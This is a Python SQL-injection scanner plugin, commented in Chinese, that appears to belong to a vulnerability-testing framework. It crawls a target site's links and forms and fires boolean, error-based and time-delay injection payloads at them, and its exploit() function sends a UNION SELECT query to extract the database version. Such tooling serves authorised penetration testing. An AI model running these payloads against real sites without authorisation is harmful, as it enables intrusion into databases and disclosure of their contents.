#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
SQL注入漏洞检测POC
"""

import requests
import urllib.parse
import re
import time
import random
import string
from typing import Tuple, Dict, Any, List, Optional, Union

# POC信息
name = "SQL注入漏洞检测"
description = "检测Web应用中的SQL注入漏洞，包括基于错误、基于时间延迟和基于布尔值的SQL注入"
author = "NetTools"
type = "SQL注入"
severity = "high"  # 严重程度: critical, high, medium, low, info

# 常见SQL错误信息特征
SQL_ERROR_PATTERNS = [
    # MySQL
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_.*",
    r"MySQLSyntaxErrorException",
    r"valid MySQL result",
    r"check the manual that corresponds to your (MySQL|MariaDB) server version",
    r"MySqlException",
    r"MySqlClient\.",
    
    # PostgreSQL
    r"PostgreSQL.*ERROR",
    r"Warning.*\Wpg_.*",
    r"valid PostgreSQL result",
    r"Npgsql\.",
    r"PG::SyntaxError:",
    r"org.postgresql.util.PSQLException",
    
    # Microsoft SQL Server
    r"Driver.* SQL[\-\_\ ]*Server",
    r"OLE DB.* SQL Server",
    r"(\W|\A)SQL Server.*Driver",
    r"Warning.*mssql_.*",
    r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}",
    r"(?s)Exception.*\WSystem\.Data\.SqlClient\.",
    r"(?s)Exception.*\WRoadhouse\.Cms\.",
    r"Microsoft SQL Native Client.*[0-9a-fA-F]{8}",
    r"SqlException",
    
    # Oracle
    r"\bORA-[0-9][0-9][0-9][0-9]",
    r"Oracle error",
    r"Oracle.*Driver",
    r"Warning.*\Woci_.*",
    r"Warning.*\Wora_.*",
    r"oracle.jdbc.driver",
    
    # SQLite
    r"SQLite/JDBCDriver",
    r"SQLite.Exception",
    r"System.Data.SQLite.SQLiteException",
    r"Warning.*sqlite_.*",
    r"Warning.*SQLite3::",
    r"\[SQLITE_ERROR\]",
    
    # Generic
    r"SQL syntax.*",
    r"Error.*SQL",
    r"SQL Error",
    r"SqlClient",
    r"SqlException",
    r"Unclosed quotation mark after the character string",
    r"DB Error",
    r"database error",
    r"Syntax error in string in query expression",
    r"JDBC Driver.*Error"
]

# 常见SQL注入测试载荷
SQL_PAYLOADS = [
    # 布尔型SQL注入测试
    ("' OR '1'='1", "' OR '1'='2"),  # 布尔型测试对
    ("\" OR \"1\"=\"1", "\" OR \"1\"=\"2"),  # 布尔型测试对
    ("1' OR '1'='1", "1' OR '1'='2"),  # 数字型布尔测试对
    ("1\" OR \"1\"=\"1", "1\" OR \"1\"=\"2"),  # 数字型布尔测试对
    ("admin' --", "admin\" --"),  # 注释测试
    ("admin' #", "admin\" #"),  # 注释测试
    ("' OR 1=1 --", "\" OR 1=1 --"),  # 常见测试
    
    # 错误型SQL注入测试
    ("'", "\""),  # 基本引号测试
    ("\\", "/"),  # 转义符测试
    ("')", "\")"),  # 括号测试
    ("';", "\";"),  # 分号测试
    
    # 时间延迟型SQL注入测试
    ("' OR (SELECT * FROM (SELECT(SLEEP(3)))a) --", "\" OR (SELECT * FROM (SELECT(SLEEP(0)))a) --"),  # MySQL 时间延迟
    ("' OR pg_sleep(3) --", "\" OR pg_sleep(0) --"),  # PostgreSQL 时间延迟
    ("' OR WAITFOR DELAY '0:0:3' --", "\" OR WAITFOR DELAY '0:0:0' --"),  # MSSQL 时间延迟
    ("' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',3) --", "\" OR 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',0) --")  # Oracle 时间延迟
]

def generate_random_string(length=8):
    """生成随机字符串"""
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))

def extract_forms(html):
    """
    从HTML中提取表单
    
    Args:
        html: HTML内容
        
    Returns:
        表单列表，每个表单包含action和输入字段
    """
    form_pattern = r'<form.*?action=["\']([^"\']*)["\'].*?>(.*?)</form>'
    input_pattern = r'<input.*?name=["\']([^"\']*)["\'].*?>'
    
    forms = []
    for form_match in re.finditer(form_pattern, html, re.DOTALL | re.IGNORECASE):
        action = form_match.group(1)
        inputs = []
        for input_match in re.finditer(input_pattern, form_match.group(2), re.DOTALL | re.IGNORECASE):
            input_name = input_match.group(1)
            if input_name:
                inputs.append(input_name)
        
        if inputs:
            forms.append({
                'action': action,
                'inputs': inputs
            })
    
    return forms

def extract_links_with_params(html, base_url):
    """
    从HTML中提取带参数的链接
    
    Args:
        html: HTML内容
        base_url: 基础URL
        
    Returns:
        带参数链接的列表
    """
    link_pattern = r'<a.*?href=["\']([^"\']+\?[^"\']*)["\']'
    
    links = []
    for link_match in re.finditer(link_pattern, html, re.IGNORECASE):
        href = link_match.group(1)
        if '?' in href and '=' in href:
            # 确保是完整的URL
            if not href.startswith(('http://', 'https://')):
                if href.startswith('/'):
                    href = base_url.rstrip('/') + href
                else:
                    href = base_url.rstrip('/') + '/' + href
            
            links.append(href)
    
    return links

def verify(target: str, session=None, **kwargs) -> Tuple[bool, str]:
    """
    验证目标是否存在SQL注入漏洞
    
    Args:
        target: 目标URL
        session: 请求会话对象
        **kwargs: 其他参数
        
    Returns:
        (是否存在漏洞, 详细信息)
    """
    # 确保目标URL以/结尾
    if not target.endswith('/'):
        target = target + '/'
    
    # 使用提供的会话或创建新会话
    if session is None:
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36'
        })
    
    # 设置请求超时
    timeout = kwargs.get('timeout', 10)
    verify_ssl = kwargs.get('verify', False)
    
    # 获取URL列表进行测试
    urls_to_test = []
    
    try:
        # 首先获取主页
        response = session.get(target, timeout=timeout, verify=verify_ssl)
        html_content = response.text
        
        # 提取带参数的链接
        param_links = extract_links_with_params(html_content, target)
        urls_to_test.extend(param_links)
        
        # 提取表单
        forms = extract_forms(html_content)
        
        # 如果没有找到任何链接或表单，尝试常见的参数名称
        if not urls_to_test and not forms:
            common_params = ["id", "page", "search", "q", "query", "keyword", "category", "item", "product", "article", "user", "username"]
            for param in common_params:
                urls_to_test.append(f"{target}?{param}=1")
    except Exception as e:
        return False, f"获取测试目标时出错: {str(e)}"
    
    # 保存发现的漏洞
    vulnerabilities = []
    
    # 测试URL参数中的SQL注入
    for url in urls_to_test:
        try:
            # 解析URL参数
            parsed_url = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed_url.query)
            
            for param, values in params.items():
                original_value = values[0] if values else "1"
                
                # 测试错误型SQL注入
                if test_error_based_injection(session, url, param, original_value, timeout, verify_ssl):
                    vulnerabilities.append({
                        "type": "错误型SQL注入",
                        "url": url,
                        "parameter": param,
                        "details": f"参数 {param} 在URL {url} 中存在错误型SQL注入漏洞"
                    })
                
                # 测试布尔型SQL注入
                elif test_boolean_based_injection(session, url, param, original_value, timeout, verify_ssl):
                    vulnerabilities.append({
                        "type": "布尔型SQL注入",
                        "url": url,
                        "parameter": param,
                        "details": f"参数 {param} 在URL {url} 中存在布尔型SQL注入漏洞"
                    })
                
                # 测试时间延迟型SQL注入
                elif test_time_based_injection(session, url, param, original_value, timeout, verify_ssl):
                    vulnerabilities.append({
                        "type": "时间延迟型SQL注入",
                        "url": url,
                        "parameter": param,
                        "details": f"参数 {param} 在URL {url} 中存在时间延迟型SQL注入漏洞"
                    })
        except Exception as e:
            continue
    
    # 测试表单中的SQL注入
    for form in forms:
        form_url = form['action']
        if not form_url.startswith(('http://', 'https://')):
            if form_url.startswith('/'):
                form_url = target.rstrip('/') + form_url
            else:
                form_url = target.rstrip('/') + '/' + form_url
        
        for input_name in form['inputs']:
            try:
                # 测试错误型SQL注入
                if test_form_error_based_injection(session, form_url, input_name, timeout, verify_ssl):
                    vulnerabilities.append({
                        "type": "错误型SQL注入",
                        "url": form_url,
                        "parameter": input_name,
                        "details": f"表单字段 {input_name} 在 {form_url} 中存在错误型SQL注入漏洞"
                    })
                
                # 测试布尔型SQL注入
                elif test_form_boolean_based_injection(session, form_url, input_name, timeout, verify_ssl):
                    vulnerabilities.append({
                        "type": "布尔型SQL注入",
                        "url": form_url,
                        "parameter": input_name,
                        "details": f"表单字段 {input_name} 在 {form_url} 中存在布尔型SQL注入漏洞"
                    })
                
                # 测试时间延迟型SQL注入
                elif test_form_time_based_injection(session, form_url, input_name, timeout, verify_ssl):
                    vulnerabilities.append({
                        "type": "时间延迟型SQL注入",
                        "url": form_url,
                        "parameter": input_name,
                        "details": f"表单字段 {input_name} 在 {form_url} 中存在时间延迟型SQL注入漏洞"
                    })
            except Exception as e:
                continue
    
    # 处理结果
    if vulnerabilities:
        vuln_details = f"发现{len(vulnerabilities)}个SQL注入漏洞:\n"
        for i, vuln in enumerate(vulnerabilities):
            vuln_details += f"{i+1}. {vuln['type']} - {vuln['url']} - 参数: {vuln['parameter']}\n"
        
        return True, vuln_details
    else:
        return False, "未发现SQL注入漏洞"

def test_error_based_injection(session, url, param, original_value, timeout, verify_ssl):
    """测试错误型SQL注入"""
    for payload in ["'", "\"", "\\", "';", "\";", "'))", "\")))"]:
        test_url = modify_url_parameter(url, param, original_value + payload)
        
        try:
            response = session.get(test_url, timeout=timeout, verify=verify_ssl)
            
            # 检查响应中是否包含SQL错误
            for pattern in SQL_ERROR_PATTERNS:
                if re.search(pattern, response.text, re.IGNORECASE):
                    return True
        except Exception:
            continue
    
    return False

def test_boolean_based_injection(session, url, param, original_value, timeout, verify_ssl):
    """测试布尔型SQL注入"""
    for true_payload, false_payload in SQL_PAYLOADS[:7]:  # 使用布尔型测试载荷
        true_url = modify_url_parameter(url, param, original_value + true_payload)
        false_url = modify_url_parameter(url, param, original_value + false_payload)
        
        try:
            true_response = session.get(true_url, timeout=timeout, verify=verify_ssl)
            false_response = session.get(false_url, timeout=timeout, verify=verify_ssl)
            
            # 如果两个响应的内容长度或状态码不同，可能存在布尔型注入
            if (abs(len(true_response.text) - len(false_response.text)) > 10 or
                true_response.status_code != false_response.status_code):
                
                # 再次检查以排除随机变化
                true_response2 = session.get(true_url, timeout=timeout, verify=verify_ssl)
                false_response2 = session.get(false_url, timeout=timeout, verify=verify_ssl)
                
                if ((abs(len(true_response.text) - len(true_response2.text)) < 5) and
                    (abs(len(false_response.text) - len(false_response2.text)) < 5) and
                    (abs(len(true_response2.text) - len(false_response2.text)) > 10)):
                    return True
        except Exception:
            continue
    
    return False

def test_time_based_injection(session, url, param, original_value, timeout, verify_ssl):
    """测试时间延迟型SQL注入"""
    for delay_payload, normal_payload in SQL_PAYLOADS[7:]:  # 使用时间延迟载荷
        try:
            delay_url = modify_url_parameter(url, param, original_value + delay_payload)
            
            # 测量响应时间
            start_time = time.time()
            session.get(delay_url, timeout=timeout+5, verify=verify_ssl)  # 延长超时时间
            response_time = time.time() - start_time
            
            # 如果响应时间大于2.5秒，可能存在时间延迟注入
            if response_time > 2.5:
                # 再次验证，使用非延迟载荷
                normal_url = modify_url_parameter(url, param, original_value + normal_payload)
                
                start_time = time.time()
                session.get(normal_url, timeout=timeout, verify=verify_ssl)
                normal_response_time = time.time() - start_time
                
                # 如果延迟载荷响应时间明显大于正常载荷，确认存在时间延迟注入
                if response_time > (normal_response_time + 2.0):
                    return True
        except Exception:
            continue
    
    return False

def test_form_error_based_injection(session, form_url, input_name, timeout, verify_ssl):
    """测试表单错误型SQL注入"""
    for payload in ["'", "\"", "\\", "';", "\";", "'))", "\")))"]:
        try:
            data = {input_name: payload}
            response = session.post(form_url, data=data, timeout=timeout, verify=verify_ssl)
            
            # 检查响应中是否包含SQL错误
            for pattern in SQL_ERROR_PATTERNS:
                if re.search(pattern, response.text, re.IGNORECASE):
                    return True
        except Exception:
            continue
    
    return False

def test_form_boolean_based_injection(session, form_url, input_name, timeout, verify_ssl):
    """测试表单布尔型SQL注入"""
    for true_payload, false_payload in SQL_PAYLOADS[:7]:  # 使用布尔型测试载荷
        try:
            true_data = {input_name: true_payload}
            false_data = {input_name: false_payload}
            
            true_response = session.post(form_url, data=true_data, timeout=timeout, verify=verify_ssl)
            false_response = session.post(form_url, data=false_data, timeout=timeout, verify=verify_ssl)
            
            # 如果两个响应的内容长度或状态码不同，可能存在布尔型注入
            if (abs(len(true_response.text) - len(false_response.text)) > 10 or
                true_response.status_code != false_response.status_code):
                
                # 再次检查以排除随机变化
                true_response2 = session.post(form_url, data=true_data, timeout=timeout, verify=verify_ssl)
                false_response2 = session.post(form_url, data=false_data, timeout=timeout, verify=verify_ssl)
                
                if ((abs(len(true_response.text) - len(true_response2.text)) < 5) and
                    (abs(len(false_response.text) - len(false_response2.text)) < 5) and
                    (abs(len(true_response2.text) - len(false_response2.text)) > 10)):
                    return True
        except Exception:
            continue
    
    return False

def test_form_time_based_injection(session, form_url, input_name, timeout, verify_ssl):
    """测试表单时间延迟型SQL注入"""
    for delay_payload, normal_payload in SQL_PAYLOADS[7:]:  # 使用时间延迟载荷
        try:
            delay_data = {input_name: delay_payload}
            
            # 测量响应时间
            start_time = time.time()
            session.post(form_url, data=delay_data, timeout=timeout+5, verify=verify_ssl)  # 延长超时时间
            response_time = time.time() - start_time
            
            # 如果响应时间大于2.5秒，可能存在时间延迟注入
            if response_time > 2.5:
                # 再次验证，使用非延迟载荷
                normal_data = {input_name: normal_payload}
                
                start_time = time.time()
                session.post(form_url, data=normal_data, timeout=timeout, verify=verify_ssl)
                normal_response_time = time.time() - start_time
                
                # 如果延迟载荷响应时间明显大于正常载荷，确认存在时间延迟注入
                if response_time > (normal_response_time + 2.0):
                    return True
        except Exception:
            continue
    
    return False

def modify_url_parameter(url, param, new_value):
    """修改URL中的参数值"""
    parsed_url = urllib.parse.urlparse(url)
    query_dict = urllib.parse.parse_qs(parsed_url.query)
    
    # 更新参数值
    query_dict[param] = [new_value]
    
    # 重新构建查询字符串
    new_query = urllib.parse.urlencode(query_dict, doseq=True)
    
    # 构建新的URL
    new_url = urllib.parse.urlunparse((
        parsed_url.scheme,
        parsed_url.netloc,
        parsed_url.path,
        parsed_url.params,
        new_query,
        parsed_url.fragment
    ))
    
    return new_url

def exploit(target: str, params: Dict[str, str], session=None, **kwargs) -> Tuple[bool, str]:
    """
    利用SQL注入漏洞获取信息
    
    Args:
        target: 目标URL
        params: 注入参数，包含 url, parameter, type
        session: 请求会话对象
        **kwargs: 其他参数
        
    Returns:
        (是否成功, 结果信息)
    """
    if not params or 'url' not in params or 'parameter' not in params:
        return False, "缺少必要的参数"
    
    url = params['url']
    param = params['parameter']
    
    # 使用提供的会话或创建新会话
    if session is None:
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36'
        })
    
    # 设置请求超时
    timeout = kwargs.get('timeout', 10)
    verify_ssl = kwargs.get('verify', False)
    
    try:
        # 尝试获取数据库版本信息
        version_payload = "' UNION SELECT 1,@@version,3,4,5-- -"
        version_url = modify_url_parameter(url, param, version_payload)
        
        response = session.get(version_url, timeout=timeout, verify=verify_ssl)
        
        # 简单的版本信息提取（实际中需要更复杂的解析）
        version_info = "未能提取版本信息"
        for line in response.text.splitlines():
            if "MySQL" in line or "SQL Server" in line or "PostgreSQL" in line or "Oracle" in line:
                version_info = line.strip()
                break
        
        return True, f"SQL注入漏洞利用结果:\n数据库版本: {version_info}\n\n注意: 实际利用需要根据具体环境定制SQL注入语句"
    
    except Exception as e:
        return False, f"利用SQL注入漏洞时出错: {str(e)}" 